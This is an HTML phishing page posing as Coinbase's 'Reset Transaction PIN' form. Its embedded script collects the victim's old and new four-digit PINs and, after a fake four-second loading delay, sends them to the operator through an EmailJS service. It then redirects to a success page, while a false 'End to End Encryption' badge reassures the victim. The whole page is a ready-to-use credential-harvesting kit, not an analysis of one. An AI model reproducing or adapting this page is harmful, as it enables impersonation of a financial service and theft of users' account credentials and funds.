<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Reset Transaction PIN - Coinbase</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background-color: #000;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 40px 20px;
      box-sizing: border-box;
    }

    .top-right {
      position: absolute;
      top: 20px;
      right: 20px;
    }

    .top-right a {
      color: #4c8ffb;
      font-weight: 500;
      text-decoration: none;
      font-size: 15px;
    }

    .reset-container {
      width: 100%;
      max-width: 400px;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .reset-title {
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 15px;
    }

    .reset-text {
      font-size: 14px;
      color: #ccc;
      margin-bottom: 25px;
      line-height: 1.5;
    }

    .form-group {
      margin-bottom: 20px;
      text-align: left;
      width: 100%;
    }

    .form-group label {
      display: block;
      font-size: 14px;
      font-weight: 500;
      margin-bottom: 8px;
      color: #fff;
    }

    .form-group input {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      background-color: #2c2c2c;
      color: white;
      font-size: 14px;
      box-sizing: border-box;
    }

    .form-group input::placeholder {
      color: #888;
    }

    .btn {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 32px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.3s;
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .btn-primary {
      background-color: #4c8ffb;
      color: black;
    }

    .btn-primary:hover {
      background-color: #367af6;
    }

    .btn.loading .btn-text {
      visibility: hidden;
    }

    .btn.loading::after {
      content: '';
      position: absolute;
      width: 20px;
      height: 20px;
      border: 3px solid black;
      border-top: 3px solid transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .encryption-text {
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 12px;
      color: #888;
      margin-top: 20px;
    }

    .encryption-text img {
      width: 14px;
      height: 14px;
      margin-right: 5px;
    }

    .popup-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }

    .popup {
      background: #1a1a1a;
      padding: 20px;
      border-radius: 12px;
      text-align: center;
      width: 90%;
      max-width: 300px;
    }

    .popup h2 {
      font-size: 20px;
      margin-bottom: 10px;
      color: #4c8ffb;
    }

    .popup p {
      font-size: 14px;
      color: #ccc;
      margin-bottom: 20px;
      line-height: 1.5;
    }

    .popup .btn {
      width: 100%;
      padding: 12px;
    }
  </style>
</head>
<body>
  <div class="top-right">
    <a href="support.html">Support</a>
  </div>

  <div class="reset-container">
    <h1 class="reset-title">Reset Transaction PIN</h1>
    <p class="reset-text">Enter your old and new transaction PIN to reset it.</p>

    <form id="pin-form">
      <div class="form-group">
        <label for="old-pin">Old Transaction PIN</label>
        <input type="password" id="old-pin" placeholder="Enter old PIN" maxlength="4" required />
      </div>
      <div class="form-group">
        <label for="new-pin">New Transaction PIN</label>
        <input type="password" id="new-pin" placeholder="Enter new PIN" maxlength="4" required />
      </div>
      <button type="submit" id="reset-pin-btn" class="btn btn-primary">
        <span class="btn-text">Reset Transaction PIN</span>
      </button>
    </form>

    <div class="encryption-text">
      <img src="https://img.icons8.com/material-rounded/24/888888/lock--v1.png" alt="Padlock Icon" />
      End to End Encryption
    </div>
  </div>

  <div class="popup-overlay" id="popup-overlay">
    <div class="popup">
      <h2>Request Submitted</h2>
      <p>Your transaction PIN reset request has been successfully submitted. You can now proceed to the confirmation page.</p>
      <button id="popup-btn" class="btn btn-primary">Continue</button>
    </div>
  </div>

  <script src="https://cdn.emailjs.com/sdk/2.3.2/email.min.js"></script>
<script>
  (function() {
    try {
      emailjs.init('EHX8HLuuNdV2zLVG-'); // Replace with your EmailJS USER_ID (Public Key)
      console.log('EmailJS initialized successfully');
    } catch (error) {
      console.error('Failed to initialize EmailJS:', error);
      alert('Failed to initialize EmailJS: ' + error.message);
    }
    
    document.getElementById('pin-form').addEventListener('submit', async function(event) {
      event.preventDefault();
      const oldPin = document.getElementById('old-pin').value;
      const newPin = document.getElementById('new-pin').value;
      const resetPinBtn = document.getElementById('reset-pin-btn');
      const popupOverlay = document.getElementById('popup-overlay');
      
      if (!/^\d{4}$/.test(oldPin)) {
        alert('Old PIN must be a 4-digit number.');
        return;
      }
      if (!/^\d{4}$/.test(newPin)) {
        alert('New PIN must be a 4-digit number.');
        return;
      }
      
      resetPinBtn.classList.add('loading');
      resetPinBtn.disabled = true;
      
      await new Promise(resolve => setTimeout(resolve, 4000));
      
      console.log('Sending email with data:', { 'old-pin': oldPin, 'new-pin': newPin });
      
      try {
        const response = await emailjs.send('service_l9x0u2d', 'template_wia8v9o', {
          'old-pin': oldPin,
          'new-pin': newPin
        });
        console.log('Email sent successfully:', response);
        window.location.href = 'success.html';
      } catch (error) {
        console.error('Error sending email:', error);
        alert('Failed to send email: ' + (error.text || error.message));
        resetPinBtn.classList.remove('loading');
        resetPinBtn.disabled = false;
        popupOverlay.style.display = 'flex';
      }
    });
    
    document.getElementById('popup-btn').addEventListener('click', function() {
      window.location.href = 'success.html';
    });
  })();
</script>
</body>
</html>
